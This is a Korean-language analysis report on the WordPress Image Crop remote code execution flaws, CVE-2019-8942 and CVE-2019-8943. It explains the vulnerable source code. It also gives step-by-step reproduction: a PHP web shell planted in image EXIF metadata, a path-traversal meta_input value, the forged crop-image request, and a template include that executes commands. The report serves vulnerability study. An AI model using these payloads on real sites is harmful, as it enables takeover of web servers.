# WordPress Image CROP RCE 분석 보고서

POC & Dockekfile : [https://github.com/synod2/WP_CROP_RCE](https://github.com/synod2/WP_CROP_RCE)

본 문서에서는 Wordpress 4.9.9 및 5.0.1 이전 버전에서 발견된 취약점으로써, WordPress Image CROP RCE로 알려진 CVE-2019-8942와 CVE-2019-8943에 대해 다룬다.

| CVE 번호      | 공개일    | 설명                                                         |
| ------------- | --------- | :----------------------------------------------------------- |
| CVE-2019-8942 | 2019-2-19 | wp_postmeta 테이블 값을 통해 악성코드가 담긴 PHP를 실행, 원격 코드 실행이 가능한 취약점 |
| CVE-2019-8943 | 2019-2-19 | 업로드된 이미지의 크기정보 따위가 변경되는 동작 발생시, meta_input 파라미터를 이용하여 임의 경로에 파일을 저장할 수 있는 취약점 |

**CVE-2019-8942** 은 이미지 파일의 exif meta data에 php 코드가 삽입된 이미지를 업로드한 후 게시글의 wp_post_meta 테이블내 wp_attached_file 값을 변경, 이미지 파일을 include 하여 임의 코드를 실행할 수 있다.

**CVE-2019-8943** 은 이미지 편집도구 사용 시 이미지의 크기정보를 업데이트하는 wp_crop_image() 함수에서 wp_postmeta 테이블의 wp_attached_file 값을 임의의 문자열로 변경, 임의 디렉토리에 파일 쓰기작업을 진행할 수 있다.

위 두 가지 취약점을 함께 사용하여 php코드가 삽입된 이미지를 임의 경로에 업로드 후 원격 코드 실행이 가능하다.

### 워드프레스의 이미지 관리방식

워드프레스에 이미지 업로드 시 최초에는 **wp-content/uploads** 디렉토리로 이동되고, 데이터 베이스에 내부적으로 참조할 정보(이미지 소유자, 업로드된 시간 따위의 메타정보)를 meta_key/meta_value의 쌍으로 저장한다.  

```cpp
mysql> select * from wp_postmeta where post_ID = 6;
| meta_id | post_id | meta_key                | meta_value
|       5 |       6 | _wp_attached_file       | 2021/05/test.png
|       6 |       6 | _wp_attachment_metadata | a:5:{s:5:"width"...
```

데이터베이스상에 위와 같이 이미지에 대한 메타정보가 저장되고, 해당 이미지를 가져올 때 **wp-content/uploads** 디렉토리에서 **_wp_attached_file** 메타정보를 이용하여 파일 이름을 찾는다. 

### POST를 이용한 메타데이터 변조

```php
#/wp-admin/includes/post.php 
function edit_post( $post_data = null ) {
⋮
if ( empty($post_data) )
		$post_data = &$_POST;
⋮
$success = wp_update_post( $post_data );
⋮
```

```php
#/wp-includes/post.php
function wp_update_post( $postarr = array(), $wp_error = false ) {
⋮
	return wp_insert_post( $postarr, $wp_error );
}
function wp_insert_post( $postarr, $wp_error = false ) {
⋮
if ( ! empty( $postarr['meta_input'] ) ) {
		foreach ( $postarr['meta_input'] as $field => $value ) {
			update_post_meta( $post_ID, $field, $value );
		}
⋮
```

eidt_post() 함수에서 POST 데이터를 별도의 필터링 없이 **$post_data** 변수에 저장하여 사용하고, wp_update_post() → wp_insrt_post() 를 거친 POST 값이 update_post_meta 함수에 의해 DB에 저장된 메타데이터를 업데이트 한다.  이때 **_wp_attached_file** 값을 업데이트하여 이미지를 가져 올 메타 데이터상의 경로를 변조시킬 수 있다. 

### 수정된 메타데이터를 통한 파일 경로 조작

```php
#wp-admin/includes/image.php
function wp_crop_image( $attachment_id, $src_x, ...) {
⋮
$src_file = get_attached_file( $src );
⋮
$result = $editor->save( $dst_file );
```

```php
#/wp-includes/post.php
function get_attached_file( $attachment_id, $unfiltered = false ) {
	$file = get_post_meta( $attachment_id, '_wp_attached_file', true );
	if ( $file && 0 !== strpos( $file, '/' ) && ! preg_match( '|^.:\\\|', $file ) && ( ( $uploads = wp_get_upload_dir() ) && false === $uploads['error'] ) ) {
			$file = $uploads['basedir'] . "/$file";
	}

	if ( $unfiltered ) {
		return $file;
	}
⋮
return apply_filters( 'get_attached_file', $file, $attachment_id );
```

파일 크기 조정시 호출되는 **wp_crop_image()** 함수는 **get_attached_file()** 함수를 통해 파일이 저장될 경로를 가져오는데, **get_attached_file()** 함수는 **get_post_meta()** 함수를 통해 DB에 저장된 **_wp_attached_file** 로 부터 파일의 경로를 가져와 수정된 이미지를 저장한다. 

위 두가지 문제점으로 인하여 결과적으로 post에 의해 조작된 파일 경로를 가져와 그 위치에 수정한 이미지를 저장하는 동작이 발생하는 것. 

### 원격 코드 실행의 원리

워드프레스 페이지의 테마는 wp-content/themes 디렉토리에 저장되어 사용되는데, 게시글 별 **_wp_page_template** post 메타데이터를 설정하여 해당 테마 디렉토리에 있는 파일을 template의 형태로 include() 함수를 실행하여 사용할 수 있다.

이때 php에서 include() 함수를 사용하듯이 해당 파일이 게시글에 포함되므로, php 코드가 포함된 이미지가 include() 된다면 php 페이지처럼 동작하여 php코드 실행이 가능해진다.

---

### 이미지 메타데이터 수정

```bash
$ exiftool test.png -CopyrightNotice="<?=\`\$_GET[0]\`?>"
$ exiftool test.png
ExifTool Version Number         : 10.80
File Name                       : test.png
Directory                       : .
File Size                       : 157 kB
File Modification Date/Time     : 2021:05:05 09:43:34+00:00
File Access Date/Time           : 2021:05:05 09:43:53+00:00
File Inode Change Date/Time     : 2021:05:05 09:43:34+00:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 480
Image Height                    : 270
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Copyright Notice                : <?=`$_GET[0]`?>
Application Record Version      : 4
Image Size                      : 480x270
Megapixels                      : 0.130
```

이미지 메타데이터의 CopyrightNotice 부분에 php 쉘 삽입 

---

### _wp_attached_file 정보 변조

![img/Untitled.png](img/Untitled.png)

![img/Untitled%201.png](img/Untitled%201.png)

![img/Untitled%202.png](img/Untitled%202.png)

업로드된 이미지 클릭 - 더 많은 상세 편집 - 업데이트 클릭시 post.php에 전달되는 요청에 **&meta_input[_wp_attached_file]=2021/05/test.jpg?/../../../../themes/twentyseventeen/shell** 파라미터 추가하여 전달

```bash
| meta_id | post_id | meta_key                | meta_value                      
+---------+---------+-------------------------+---------------------------------
|     338 |     135 | _wp_attached_file              | 2021/05/test.jpg?/../../../../themes/twentyseventeen/cropped-shell
```

DB에서 **_wp_attached_file** 변조된 것 확인됨

### crop_image() 호출하여 임의경로에 파일 저장

![img/Untitled%203.png](img/Untitled%203.png)

![img/Untitled%204.png](img/Untitled%204.png)

업로드된 이미지 클릭 - 이미지 편집 - 크기 변경 후 "크기" 버튼 클릭 시 admin-ajax.php 에 전달되는 요청에 파라미터를 변조하여 전달 

![img/Untitled%205.png](img/Untitled%205.png)

```bash
action=crop-image&_ajax_nonce=<nonce>&id=<이미지ID>&cropDetails[x1]=480&cropDetails[y1]=480&cropDetails[width]=10&cropDetails[height]=10&cropDetails[dst_width]=10&cropDetails[dst_height]=10&meta_input[_wp_attached_file]=2021/05/test.jpg?/../../../../themes/twentyseventeen/shell
```

```bash
/wordpress/wp-content/themes/twentyseventeen $ ls
404.php       cropped-shell.jpg  header.php  README.txt      search.php   template-partsarchive.php   footer.php         inc         rtl.css         sidebar.phpassets        front-page.php     index.php   screenshot.png  single.php
comments.php  functions.php      page.php    searchform.php  style.css
```

**cropped-shell.jpg**  파일이 테마 디렉토리에 생성된 것 확인됨. 

### 게시글 템플릿 변경하여 원격 코드 실행

![img/Untitled%206.png](img/Untitled%206.png)

게시글 작성 - post.php에 전달되는 요청에 **&meta_input[_wp_page_template]=cropped-shell.jpg** 파라미터 추가하여 전달, 파일을 게시글에 include 함

---

### 결과

![img/Untitled%207.png](img/Untitled%207.png)

include 된 이미지파일의 php 코드가 동작하고, 게시글에 post 인자로 넘기는 값이 시스템 명령어로 실행되는 것 확인됨. 

---

### 참고 문서

[https://github.com/v0lck3r/CVE-2019-8943/blob/main/RCE_wordpress.py](https://github.com/v0lck3r/CVE-2019-8943/blob/main/RCE_wordpress.py) - python poc 코드

[https://blog.sonarsource.com/wordpress-image-remote-code-execution?redirect=rips](https://blog.sonarsource.com/wordpress-image-remote-code-execution?redirect=rips) - WP-CROP-RCE 취약점 분석 보고서

[https://blog.naver.com/skinfosec2000/221517528775](https://blog.naver.com/skinfosec2000/221517528775) - WP-CROP-RCE 취약점 분석 보고서 

[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942) - CVE 공식 페이지

[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943) - CVE 공식 페이지